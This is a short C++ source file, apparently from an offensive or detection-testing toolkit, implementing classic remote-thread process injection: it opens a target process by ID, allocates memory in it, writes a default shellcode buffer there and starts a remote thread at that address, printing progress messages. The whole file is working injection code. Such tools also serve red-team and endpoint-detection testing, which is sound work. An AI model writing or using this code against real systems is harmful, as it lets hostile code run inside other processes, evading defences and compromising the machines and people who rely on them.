#include <cstdio>

#include "sysapi.h"
#include "scripts.h"

namespace scripts {

bool inject_create_remote_thread(uint32_t pid,
                                 RemoteProcessOpenMethod open_method,
                                 RemoteProcessMemoryMethod memory_method) {

    wprintf(L"\nOpening the target process\n");
    sysapi::unique_handle ProcessHandle = process_open(open_method, pid);
    if (ProcessHandle == NULL) {
        return false;
    }

    wprintf(L"  [+] process opened, HANDLE = 0x%p\n", ProcessHandle.get());

    wprintf(L"\nPlacing shellcode in the target process\n");

    RemoteProcessMemoryContext ctx;
    ctx.method = memory_method;
    ctx.ProcessHandle = ProcessHandle.get();
    ctx.Size = (ULONG)default_shellcode_size;

    bool res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    wprintf(L"  [*] writing shellcode...\n");

    res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
    if (!res) {
        return false;
    }

    wprintf(L"\nExecuting shellcode\n");

    wprintf(L"  [*] starting new thread with shellcode start address...\n");

    sysapi::unique_handle target_thread = sysapi::ThreadCreate(ProcessHandle.get(), ctx.RemoteBaseAddress);
    if (target_thread == NULL) {
        return false;
    }

    wprintf(L"\nSuccess\n");
    return true;
}

}